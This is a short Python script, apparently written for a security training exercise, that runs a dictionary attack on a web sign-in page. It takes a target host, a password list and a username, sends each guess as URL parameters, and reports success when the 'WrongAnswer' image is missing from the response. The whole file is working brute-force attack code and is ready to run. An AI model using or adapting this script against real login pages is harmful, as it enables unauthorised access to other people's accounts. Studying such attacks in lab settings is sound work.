#! /bin/env python

import requests
import sys

requrl = "http://{}/?page=signin&username={}&password={}&Login=Login#"


def main():
    ip = sys.argv[1]
    pass_dict = sys.argv[2]
    username = sys.argv[3]
    with open(pass_dict) as dict_file:
        for password in dict_file:
            password = password.strip()
            print(f"testing: {password}")
            cur_url = requrl.format(ip, username, password)
            res = requests.get(cur_url)
            if "images/WrongAnswer.gif" not in res.text:
                print(f"Found match with password: {password}")
                exit(1)


if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Missing target ip/hostname, dict file, and username")
        exit(1)
    main()
